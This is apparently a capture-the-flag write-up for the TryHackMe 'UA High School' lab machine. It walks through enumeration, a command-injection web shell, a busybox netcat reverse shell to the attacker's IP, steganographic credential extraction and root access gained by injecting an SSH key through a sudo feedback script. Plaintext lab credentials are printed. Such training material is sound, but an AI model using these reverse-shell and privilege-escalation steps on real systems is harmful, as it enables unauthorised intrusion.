# Enumeration

## Nmap

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4WNbSymq7vKwxstoKDOXzTzNHnE4ut9BJPBlIb44tFvtMpfpXDF7Bq7MT9q4CWASVfZTw763S0OrtvpBFPpN/4eOvlircakFfkR3hZk7dHOXe8+cHXDth90XnMa2rq5CfxwinqP/Mo67XcpagbpU9O5lCatTMPWBUcEhIOXY8aUSMkmN6wRYSxdI40a4IYsjRqkqsdA6yaDQBSx+ryFRXwS9+kpUskAv452JKi1u2H5UGVX862GC1xAYHapKY24Yl6l5rTToGqTkobHVCv6t9dyaxkGtc/Skoi2mkWE/GM0SuqtbJ9A1qhSrfQRNpcIJ6UaVhDdUeO3qPX2uXPyLrY+i+1EgYEsRsxD5ym0bT1LPby8ONPduBEmZfnNoN5IBR05rQSSHhj349oNzDC4MRn2ygzOyx0n0c7wqffaAuohbu0cpeAcl5Nwb/Xw42RABDFQx08CttjNmtPMK/PqFt+H4nubyp7P8Pwctwi3wLf2GbU1lNgT0Ewf2GnfxY5Bs=
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+IqWgEnT5Asc+8VrYsQACkIjP+2CKuoor+erbKjpKwM8+X+1TPuwG56O6LxOLXeS2/pFjv9PBFI1oqHKa4GNw=
|   256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQa5m2TxGI3a9ZwhAd0zWsAYwCsYANdo6fgpS8XiJKL

80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: U.A. High School
```

## SSH (22)

- Need password to access

## HTTP (80)

### Dirsearch

```bash
Target: http://10.10.161.49/

[02:19:47] Starting: 
[02:20:09] 403 -  277B  - /.ht_wsr.txt                                      
[02:20:09] 403 -  277B  - /.htaccess.bak1                                   
[02:20:09] 403 -  277B  - /.htaccess.sample                                 
[02:20:09] 403 -  277B  - /.htaccess.orig
[02:20:10] 403 -  277B  - /.htaccess.save
[02:20:10] 403 -  277B  - /.htaccess_orig                                   
[02:20:10] 403 -  277B  - /.htaccess_extra                                  
[02:20:10] 403 -  277B  - /.htaccess_sc
[02:20:10] 403 -  277B  - /.htaccessBAK
[02:20:10] 403 -  277B  - /.htaccessOLD2
[02:20:10] 403 -  277B  - /.htm                                             
[02:20:10] 403 -  277B  - /.htaccessOLD                                     
[02:20:10] 403 -  277B  - /.html                                            
[02:20:10] 403 -  277B  - /.htpasswd_test                                   
[02:20:10] 403 -  277B  - /.htpasswds                                       
[02:20:10] 403 -  277B  - /.httr-oauth
[02:20:17] 403 -  277B  - /.php                                             
[02:20:35] 200 -    1KB - /about.html                                       
[02:21:13] 301 -  313B  - /assets  ->  http://10.10.161.49/assets/          
[02:21:13] 200 -    0B  - /assets/
[02:21:32] 200 -  924B  - /contact.html 
```

### Vhost

```bash
n/a
```

### Website Functionality

```bash
┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
└─$ dirsearch -u http://10.10.161.49/assets/index.php
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/tryhackme/UAhighschool/reports/http_10.10.161.49/_assets_index.php_25-05-19_02-38-44.txt

Target: http://10.10.161.49/

[02:38:44] Starting: assets/index.php/
[02:38:50] 404 -  274B  - /assets/index.php/%2e%2e//google.com              
[02:41:22] 200 -   40B  - /assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/UA%20High%20School%20(THM)/Images/image.png?raw=true)

```bash
┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
└─$ curl http://10.10.161.49/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    40  100    40    0     0     44      0 --:--:-- --:--:-- --:--:--    44
images  index.php  styles.css
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/UA%20High%20School%20(THM)/Images/image%20(1).png?raw=true)

```bash
http://10.10.161.49/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=which%20nc
```

```bash
┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
└─$ echo L3Vzci9iaW4vbmMK | base64 -d
/usr/bin/nc
```

- This means the box has netcat

### Busybox

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/UA%20High%20School%20(THM)/Images/image%20(2).png?raw=true)

```bash
http://10.10.161.49/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=which%20busybox
```

```bash
┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
└─$ echo L3Vzci9iaW4vYnVzeWJveAo= | base64 -d
/usr/bin/busybox
```

- busybox is stable shell

```bash
http://10.10.161.49/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=busybox%20nc%2010.4.9.248%201337%20-e%20bash
```

- busybox nc <ip> -e bash
- Connected nc on busybox

```bash
┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.4.9.248] from (UNKNOWN) [10.10.161.49] 43470
whoami
www-data
```

```bash
www-data@myheroacademia:/var/www/html/assets/images$ ls -la
total 336
drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
www-data@myheroacademia:/var/www/html/assets/images$ python3 -m http.server 8000 
```

- cannot see .jpg
- so transfer to own machine

```bash
┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
└─$ file oneforall.jpg 
oneforall.jpg: data
```

- cannot open data file.
- It is not jpg, magic byte is different
- Change to jpeg image byte
    
    ```bash
    ┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
    └─$ hexeditor oneforall.jpg 
                                                                                                                                          
    ┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
    └─$ file oneforall.jpg 
    oneforall.jpg: JPEG image data
    ```
    
    ![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/UA%20High%20School%20(THM)/Images/image%20(3).png?raw=true)
    

```bash
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt 
QWxsbWlnaHRGb3JFdmVyISEhCg==
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt | base64 -d
AllmightForEver!!!
```

### Steganography

```bash
┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
└─$ steghide extract -sf oneforall.jpg
Enter passphrase: 
Corrupt JPEG data: 16 extraneous bytes before marker 0xdb
wrote extracted data to "creds.txt". 
```

```bash
┌──(kali㉿kali)-[~/tryhackme/UAhighschool]
└─$ cat creds.txt 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

- login as ssh deku

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/UA%20High%20School%20(THM)/Images/image%20(4).png?raw=true)

## Post Exploitation

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/UA%20High%20School%20(THM)/Images/image%20(5).png?raw=true)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
/home/kali/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase for "/home/kali/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:YjXRBd+f=======LKJ8SQciUUwlWv6w kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|o+B=o ..+o.o.  . |
|.= +.. o .o. ...o|
|  . +.o +  .. .=o|
|   ..o.o .. . =.B|
|    .oo S  . = *+|
|    .. .    . B o|
|   E         . =.|
|                .|
|                 |
+----[SHA256]-----+
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cd /home/kali/.ssh/
                                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ ls
id_rsa  id_rsa.pub  known_hosts  known_hosts.old
                                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ chmod 600 id_rsa     
                                                                                                                                      
┌──(kali㉿kali)-[~/.ssh]
└─$ cat id_rsa.pub  
ssh-rsa AAAAB3NzaC1yc2EAAAAD========g8U= kali@kali
```

```bash
deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
ssh-rsa AAAAB========3N8U= kali@kali > /root/.ssh/authorized_keys
It is This:
Feedback successfully saved.
```

```bash
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh -i id_rsa root@10.10.165.158
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 19 May 2025 08:28:49 AM UTC
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/UA%20High%20School%20(THM)/Images/image%20(6).png?raw=true)
